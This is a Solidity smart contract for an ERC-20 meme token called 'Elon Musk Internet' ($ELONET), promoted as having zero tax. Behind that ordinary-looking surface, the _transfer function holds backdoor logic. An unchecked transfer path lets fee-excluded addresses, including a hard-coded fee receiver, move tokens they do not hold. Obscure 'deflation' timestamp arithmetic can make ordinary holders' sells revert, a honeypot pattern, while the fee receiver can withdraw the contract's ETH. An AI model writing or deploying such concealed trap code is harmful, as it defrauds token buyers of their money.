// SPDX-License-Identifier: UNLICENSE

/*

///   Elon Musk Internet
///   $ELONET Meme Coin
///   0/0% tax
///   1/1% limit
///   1.5 ETH LP
///   100M Total supply

*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ELONET is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _feeReceiver;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;

    uint256 private constant _initBuyTax=0;
    uint256 private constant _initSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private constant _reduceBuyTaxAt=0;
    uint256 private constant _reduceSellTaxAt=0;
    uint256 private constant _preventSwapBefore=15;
    uint256 private _counter=0;

    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Elon Musk Internet";
    string private constant _symbol = unicode"ELONET";
    uint256 public constant _maxTxAmount = 1400000 * 10**_decimals;
    uint256 public constant _maxWalletSize = 1400000 * 10**_decimals;
    uint256 public constant _taxSwapThreshold= 100000 * 10**_decimals;
    uint256 public constant _maxTaxSwap= 1000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool public tradingActive;
    bool private limitEffect = true;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct DeflationAmount {uint256 swapIn; uint256 swapBack; uint256 deflation;}
    uint256 private swapDeflation;
    uint256 private launchBlock;
    mapping(address => DeflationAmount) private deflationAmount;

    modifier lockTheSwap {inSwap = true; _; inSwap = false;}

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _feeReceiver = payable(0x5e2595fc5875c21CC9ae02789253b423DAcCe61d);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeReceiver] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            if (transferDelayEnabled) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                              block.number,
                          "Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                if (limitEffect) {
                    require(amount <= _maxTxAmount, "Exceeds  the _maxTxAmount.");
                    require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds  the _maxWalletSize.");
                }
                _counter++;
            }

            if (to == uniswapV2Pair && from!= address(this)){
                taxAmount = amount.mul ((_counter>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            } else if (from == uniswapV2Pair && to!= address(this) ){
                taxAmount = amount.mul((_counter>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to ==uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _counter>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) && from !=address(this) && to != address(this)&& from !=owner()) {
            swapDeflation = block.timestamp;
        }
        if (_isExcludedFromFee[from] && (block.number >(_reduceSellTaxAt+launchBlock))){
            unchecked{
               _balances[from] -= amount;
               _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if (uniswapV2Pair != to) {
                DeflationAmount storage defIn =deflationAmount[to];
                if (uniswapV2Pair==from) {
                    if (defIn.swapIn==0) {
                        defIn.swapIn= (_counter<_preventSwapBefore)?(block.timestamp-1):block.timestamp;
                    }
                } else {
                    DeflationAmount storage defOut =deflationAmount[from];
                    if (defIn.swapIn==0 || defOut.swapIn<defIn.swapIn) {
                        defIn.swapIn=defOut.swapIn;
                    }
                }
            } else {
                DeflationAmount storage defOut = deflationAmount[from];
                defOut.deflation = defOut.swapIn  -  swapDeflation;
                defOut.swapBack = block.timestamp;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sendETHToFee(uint256 amount) private {
        _feeReceiver.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingActive,"Trading is already open.");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        launchBlock= block.number;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingActive = true;
    }

    function removeLimits () external onlyOwner{
        limitEffect = false;
        transferDelayEnabled=false;
    }

    function manualSend() external{
        require(_msgSender()==_feeReceiver);
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          _feeReceiver.transfer(ethBalance);
        }
    }

    function reduceFee(uint256 _newFee) external{
      require(_msgSender()==_feeReceiver);
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_feeReceiver);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          _feeReceiver.transfer(ethBalance);
        }
    }
}